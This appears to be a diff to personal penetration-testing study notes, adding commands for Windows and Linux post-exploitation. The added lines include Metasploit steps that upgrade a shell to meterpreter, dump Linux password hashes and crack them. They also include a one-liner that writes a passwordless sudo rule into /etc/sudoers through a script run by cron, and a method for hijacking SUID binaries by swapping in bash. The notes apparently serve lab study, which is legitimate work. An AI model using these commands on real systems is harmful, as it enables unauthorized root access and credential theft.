@@ -1,4 +1,5 @@
-
+`service postgresql start && msfconsole `
+`use post/multi/manage/shell_to_meterpreter` -- to shell to meterpreter
 # Windows
 
 ### Frequently Exploited Windows Services
@@ -196,4 +197,22 @@ that is a part of the local administrators group on the Windows target system
 - GitHub: https://github.com/mzet-/linux-exploit-suggester -- this will enum all the known vulnerability within this particular version of Linux.
 
 ###### Exploiting Misconfigured Cron Jobs
-- 
+- `crontab -l`
+- `sudo -l` -- to check if the current user can run any utility
+- `printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh` -- when you don't have editor
+
+###### Exploiting SUID Binaries
+- This is the functionality that we will be attempting to exploit in order to elevate our privileges, however, the success of our attack will depend on the following factors:
+	- Owner of the SUID binary – Given that we are attempting to elevate our privileges, we will only be exploiting SUID binaries that are owned by the “root” user or other privileged users.
+	- Access permissions – We will require executable permissions in order to execute the SUID binary.
+- check `strings file1` weather it is calling other binary or not if it then you can remove the file and `cp /bin/bash file2` and then execute file1
+
+
+### Linux Credential Dumping
+
+###### Dumping Linux Password Hashes
+- `use post/linux/gather/hashdump` -- to gather hashdump
+- for cracking password
+	use auxiliary/analyze/crack_linux
+	 set SHA512 true 
+	 run
